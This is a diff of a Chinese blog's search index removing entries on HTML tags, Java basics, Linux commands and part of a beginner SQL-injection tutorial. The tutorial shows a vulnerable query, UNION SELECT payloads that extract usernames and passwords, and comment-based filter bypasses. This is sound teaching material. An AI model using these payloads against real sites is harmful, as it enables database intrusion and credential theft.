-<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
-<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>
-
-<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>
-
-<p>表格</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
-<p>main     网页的主体部分（一般只有一个）</p>
-<p>footer   网页的底部</p>
-<p>nav      网页的导航</p>
-<p>aside    和主题相关的内容</p>
-<p>article  文章之类的</p>
-<p>section  独立的块区，上面的标签都不合适，就用这个</p>
-<p>div      块元素</p>
-<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>
-
-<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>
-
-<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>HTML</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Java简介</title>
-    <url>/2023/07/26/Java1/</url>
-    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
-
-<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
-<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
-<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
-<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
-<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
-<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
-<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
-<p>JVM&amp;JRE&amp;JDK关系图</p>
-<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
-<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
-<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
-<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
-<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
-<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
-<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
-<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
-<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
-<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
-<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
-<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
-<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
-<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
-<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
-<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
-<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
-<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
-<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
-<p>代表语言：C、C++、C#、Java、Object-C。</p>
-<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
-<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
-<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
-<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Java面向对象</title>
     <url>/2023/07/27/Java3/</url>
     <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><span id="more"></span>
@@ -975,74 +1043,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux</title>
-    <url>/2023/08/09/Linux/</url>
-    <content><![CDATA[<h1 id="Linux操作系统获取方式"><a href="#Linux操作系统获取方式" class="headerlink" title="Linux操作系统获取方式"></a>Linux操作系统获取方式</h1><span id="more"></span>
-
-<p>以centOS为例，获取方法大致分为两种：</p>
-<ul>
-<li><p>从<a href="https://www.centos.org/download/">CentOS官网</a>获取；</p>
-</li>
-<li><p>从镜像网站获取</p>
-<ul>
-<li><p>以</p>
-<p>阿里云镜像</p>
-<p>网站平台为例。</p>
-<ul>
-<li>新版本镜像地址： <a href="https://mirrors.aliyun.com/centos/">https://mirrors.aliyun.com/centos/</a></li>
-<li>旧版本镜像地址： <a href="https://mirrors.aliyun.com/centos-vault/">https://mirrors.aliyun.com/centos-vault/</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h1 id="Linux-接口"><a href="#Linux-接口" class="headerlink" title="Linux 接口"></a>Linux 接口</h1><p>Linux 系统是一种金字塔模型的系统，如下所示</p>
-<p><img src="https://img2020.cnblogs.com/blog/1515111/202010/1515111-20201010070233641-1312039505.png" alt="img"></p>
-<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><p>pwd 显示工作路径</p>
-<p>shutdown -h now 关闭系统  &#x2F;halt 关闭系统</p>
-<p>shutdown -r now 重启 &#x2F; reboot 重启</p>
-<p>systemctl stop firewalld　　关闭防火墙</p>
-<p>ip addr　　查看ip地址</p>
-<p>1、<strong>cd命令</strong>：这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p>
-<p>cd &#x2F;home 　 进入根目录下面的home目录<br>cd home 　 进入当前目录下的home目录<br>cd ..　　　 返回上一层目录<br>cd ..&#x2F;.. 　　 返回上两级目录<br>cd &#x2F;　　　　　返回跟目录<br>cd - 　　　　返回上次所在的目录 </p>
-<p>2、<strong>ls命令</strong>：这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p>
-<p>ls 　　　查看目录中的文件<br>ls -a　　列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来<br>ls -l 　 显示文件和目录的详细资料 </p>
-<p>ls A*    意味着只列出以 A 为开头的所有文件</p>
-<p>3、<strong>mkdir命令</strong>：创建</p>
-<p>mkdir dir1 创建一个叫做 ‘dir1’ 的目录’<br>mkdir dir1 dir2 同时创建两个目录 </p>
-<p>4、<strong>rm命令</strong>：删除</p>
-<p>rm -f file1　　 删除一个叫做 ‘file1’ 的文件’<br>rmdir dir1 　　删除一个叫做 ‘dir1’ 的目录’ （空目录才能删除）<br>rm -rf dir1 　　删除一个叫做 ‘dir1’ 的目录并同时删除其内容<br>rm -rf dir1 dir2　　 同时删除两个目录及它们的内容 </p>
-<p>rm A*      会移除所有以 A 为开头的文件而不是只删除文件名是 <code>A*</code> 的文件</p>
-<p>5、<strong>mv命令</strong>：该命令用于移动文件、目录或更名，move之意，它的常用参数如下：-f 如果目标文件已经存在，不会询问而直接覆盖</p>
-<p>mv file1 file2  把文件file1重命名为file2 </p>
-<p>mv file1 file2 dir  把文件file1、file2移动到目录dir中</p>
-<p>6、<strong>cp命令</strong>：该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下， 它的常用参数如下：</p>
-<p>cp -a file1 file2 连同文件的所有特性把文件file1复制成文件file2<br>cp dir&#x2F;* . 复制一个目录下的所有文件到当前工作目录<br>cp -a &#x2F;tmp&#x2F;dir1 . 复制一个目录到当前工作目录<br>cp -a dir1 dir2 复制一个目录 </p>
-<p>7、<strong>find命令</strong>：find是一个基于查找的功能非常强大的命令</p>
-<p>find &#x2F; -name file1 从 ‘&#x2F;‘ 开始进入根文件系统搜索文件和目录<br>find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录<br>find &#x2F;home&#x2F;user1 -name *.bin 在目录 ‘&#x2F; home&#x2F;user1’ 中搜索带有’.bin’ 结尾的文件<br>find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件<br>find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件 </p>
-<p>8、<strong>ps命令</strong>：该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p>
-<p>-A ：所有的进程均显示出来<br>-a ：不与terminal有关的所有进程<br>-u ：有效用户的相关进程<br>-x ：一般与a参数一起使用，可列出较完整的信息<br>-l ：较长，较详细地将PID的信息列出<br>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p>
-<p>ps aux  查看系统所有的进程数据<br>ps ax  查看不与terminal有关的所有进程<br>ps -lA  查看系统所有的进程数据<br>ps axjf  查看连同一部分进程树状态</p>
-<p>9、<strong>kill命令</strong>：该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p>
-<p>kill -signal PID<br>signal的常用参数如下：注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p>
-<p>1：SIGHUP，启动被终止的进程<br>2：SIGINT，相当于输入ctrl+c，中断一个程序的进行<br>9：SIGKILL，强制中断一个进程的进行<br>15：SIGTERM，以正常的结束进程方式来终止进程<br>17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行<br>例如：</p>
-<p># 以正常的结束进程方式来终于第一个后台工作，可用jobs命令查看后台中的第一个工作进程<br>kill -SIGTERM %1<br># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进行筛选获得<br>kill -SIGHUP PID </p>
-<p> 10、<strong>tar命令</strong>：该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p>
-<ol>
-<li>压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称 </li>
-<li>查询：tar -jtv -f filename.tar.bz2 </li>
-<li>解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</li>
-</ol>
-<p>11、chmod命令：该命令用于改变文件的权限，一般的用法如下：</p>
-<p>chmod -R 777   chmod -R 777 意思就是将当前目录及目录下所有文件都给予777权限（所有权限）</p>
-<p><strong>查看文件内容</strong><br>cat file1 从第一个字节开始正向查看文件的内容<br>tac file1 从最后一行开始反向查看一个文件的内容<br>more file1 查看一个长文件的内容<br>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1 查看一个文件的前两行<br>tail -2 file1 查看一个文件的最后两行<br>tail -f &#x2F;var&#x2F;log&#x2F;messages 实时查看被添加到一个文件中的内容 </p>
-<p><strong>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</strong><br>yum install package_name 下载并安装一个rpm包<br>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm 更新当前系统中所有安装的rpm包<br>yum update package_name 更新一个rpm包<br>yum remove package_name 删除一个rpm包<br>yum list 列出当前系统中安装的所有包<br>yum search package_name 在rpm仓库中搜寻软件包<br>yum clean packages 清理rpm缓存删除下载的包<br>yum clean headers 删除所有头文件<br>yum clean all 删除所有缓存的包和头文件 </p>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP</title>
     <url>/2023/08/09/PHP/</url>
     <content><![CDATA[<h2 id="基本的-PHP-语法"><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2><span id="more"></span>
@@ -1170,336 +1170,6 @@ chmod(&quot;/somedir/somefile&quot;, 0755);
 ]]></content>
       <tags>
         <tag>PHP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入</title>
-    <url>/2023/08/04/SQL%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h2><span id="more"></span>
-
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。</p>
-<p>比如下面的语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.$_GET[&quot;id&quot;];</span><br></pre></td></tr></table></figure>
-
-<p>对于他的预期操作，一般一个id是用来索引的,传入的值应该是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] = 1;</span><br><span class="line">$_GET[&quot;id&quot;] = 2;</span><br></pre></td></tr></table></figure>
-
-<p>所以预期执行的语句应该是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  1&quot;;</span><br><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id =  2&quot;;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<p>在没有过滤的情况下，我们能够在后面拼接我们自己的语句</p>
-<p>比如，我们传入的值：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_GET[&quot;id&quot;] =&quot;1 union select username,password from user&quot;</span><br></pre></td></tr></table></figure>
-
-<p>那么最后执行的语句就是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql = &quot;SELECT username,password FROM users WHERE id = 1 union select username,password from user;&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261635588.png" alt="image-20230426163533547"></p>
-<p>这样就造成了非预期语句的执行，我们在获得 <code>users</code> 表中的预期数据的同时也获得了 <code>users</code> 表中的非预期数据。</p>
-<p>当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。</p>
-<p>下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。</p>
-<h3 id="SQL数据库基础"><a href="#SQL数据库基础" class="headerlink" title="SQL数据库基础"></a>SQL数据库基础</h3><h4 id="数据库结构基础"><a href="#数据库结构基础" class="headerlink" title="数据库结构基础"></a>数据库结构基础</h4><p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261646646.png" alt="image-20230426164654561"></p>
-<p><img src="https://nssctf.wdf.ink//img/WDTJ/202304261652391.png" alt="image-20230426165200366"></p>
-<p>如图所示 数据库 为层级结构：</p>
-<ul>
-<li>数据库 ( database )</li>
-<li>表 ( table )<ul>
-<li>列 (column)</li>
-<li>数据</li>
-</ul>
-</li>
-</ul>
-<h4 id="数据库语法基础¶"><a href="#数据库语法基础¶" class="headerlink" title="数据库语法基础¶"></a>数据库语法基础<a href="https://ctf.tj.cn/ctf_web/sql_injection/#_3">¶</a></h4><p>常用语法：</p>
-<ul>
-<li><code>SELECT</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>UNION</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 列名 FROM 表名</span><br><span class="line">UNION</span><br><span class="line">SELECT 列名_1 FROM 表名_1;</span><br></pre></td></tr></table></figure>
-
-<p> 注意 使用 <code>UNION</code> 的时候要注意两个表的列数量必须相同。</p>
-<ul>
-<li><code>LIMIT</code></li>
-<li><code>SQL SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据 SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据 #比如 LIMIT 10, 10 返回11-20行数据</code></li>
-<li><code>SQL SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;</code></li>
-<li><code>注释</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释</span><br><span class="line">DROP sampletable;# 后面的内容都将被注释</span><br><span class="line">  DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格</span><br><span class="line">  #/*中间的内容都将被注释*/</span><br><span class="line">  SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>Order by</code></li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];</span><br><span class="line"># 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。</span><br><span class="line"># 在SQL注入中我们常用它来判断列数</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错</span><br><span class="line">SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错</span><br></pre></td></tr></table></figure>
-
-<p>常用参数：</p>
-<ul>
-<li><code>user()</code>：当前数据库用户</li>
-<li><code>database()</code>：当前数据库名</li>
-<li><code>version()</code>：当前使用的数据库版本</li>
-<li><code>@@datadir</code>：数据库存储数据路径</li>
-<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
-<li><code>group_concat()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
